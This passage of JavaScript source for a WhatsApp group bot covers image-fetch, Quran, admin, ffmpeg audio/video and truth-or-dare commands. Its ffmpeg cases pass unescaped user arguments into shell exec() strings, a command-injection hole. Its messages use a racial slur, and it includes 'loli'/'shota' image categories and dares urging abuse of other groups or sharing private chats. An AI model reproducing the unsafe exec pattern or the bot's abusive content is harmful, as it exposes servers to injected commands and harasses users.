if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
nØbødy.sendMessage(m.chat, { image: { url: yeha }, caption : "> SUPER ✅"  }, { quoted: m })
}
break
case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    reply1(quranSurah)

    if (json.data.recitation.full) {
      nØbødy.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    reply1(`Error: ${error.message}`)
  }
  }
   break
case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return reply1('Can Only Be Use in Group')
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
    nØbødy.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'public': {
  if (!DevOnly) return 
  nØbødy.public = true;
  reply1(`*Successfully Change Mode Self To Public*`);
}
break;

//END
//CONTROL CASE

case 'self': case 'private': {
  if (!DevOnly) return
  nØbødy.public = false;
  reply1(`*Successfully Change Mode Public To Self*`);
}
break;
case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            reply1(`Total Features of ${global.botname} is ${Archerfeat()}`)
        break
case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return m.reply("NIGGA THIS IS A GROUP COMMAND")
                if (!Adm && !isGroupOwner && !DevOnly) return reply1("NIGGA YOU MUST BE ADMIN TO USE THIS COMMAND")
                if (!BotAdm) return reply1("THIS COMMAND CAN BE USE WHEN BOT IS AN ADMIN")
                if (!text) return reply1('Text ?')
                await nØbødy.groupUpdateDescription(m.chat, text)
                reply1('Successfully Done ✊')
                break
case 'totag':
                if (!m.isGroup) return m.reply("NIGGA THIS IS A GROUP COMMAND")
                if (!BotAdm) return reply1("THIS COMMAND CAN BE USE WHEN BOT IS AN ADMIN")
                if (!Adm) return reply1("BOT MUST BE ADMIN")
                if (!m.quoted) return reply1(`Reply media with caption ${prefix + command}`)
                nØbødy.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return reply1(`Reply sticker with caption *${prefix + command}*`)
                let media = await nØbødy.downloadAndSaveMediaMessage(m.quoted)
                let webpToMp4 = await webp2mp4File(media)
                await nØbødy.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply1(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                let media = await nØbødy.downloadMediaMessage(quoted)
                let { toAudio } = require('./System/Data4');
                let audio = await toAudio(media, 'mp4')
                nØbødy.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `nobody.mp3`
                }, {
                    quoted: m
                })

            }
            break
case 'volaudio': {
if (!args.join(" ")) return reply1(`Example: ${prefix + command} 10`)
media = await nØbødy.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply1('Error!')
jadie = fs.readFileSync(rname)
nØbødy.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'fliptext': {
                if (args.length < 1) return reply1(`Example:\n${prefix}fliptext Nobody`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                reply1(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
case 'dlt': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 nØbødy.sendMessage(m.chat, { delete: key })
}
break
case 'getcase':
                if (!DevOnly) return reply1('THIS IS THE OWNER COMMAND BRO')
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + require("./SuperBot.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   reply1(`${getCase(q)}`)
                } catch {
                  reply1(`case ${q} not found!`)
                }
            break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                let media = await nØbødy.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                nØbødy.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(example(`reply to an audio`))
                } catch (e) {
                m.reply(e)
                }
                break
case 'volvideo': {
if (!args.join(" ")) return reply1(`Example: ${prefix + command} 10`)
media = await nØbødy.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply1('Error!')
jadie = fs.readFileSync(rname)
nØbødy.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./trashbase/lib/scraper1')
		if (!text) return reply1('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                reply1(teks)
	    }
	    break                                                                   
case 'ebinary': {
if (!q) return reply1(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('../trashbase/lib/binary')
let eb = await eBinary(`${q}`)
reply1(eb)
}
break
case 'say': case 'tts': case 'gtts':{
if (!text) return reply1('Where is the text?')
            let texttts = text
            let { toAudio } = require('./System/Data4');
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return nØbødy.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return reply1('Can Only Be Use in Group')
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
nØbødy.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
nØbødy.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
nØbødy.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'anime': {
if (!text) return reply1(`Which anime are you looking for?`)
const malScraper = require('mal-scraper')
await loading()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply1(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await nØbødy.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return reply1(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return reply1(textquotes)
break
case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner Nobody through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              nØbødy.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
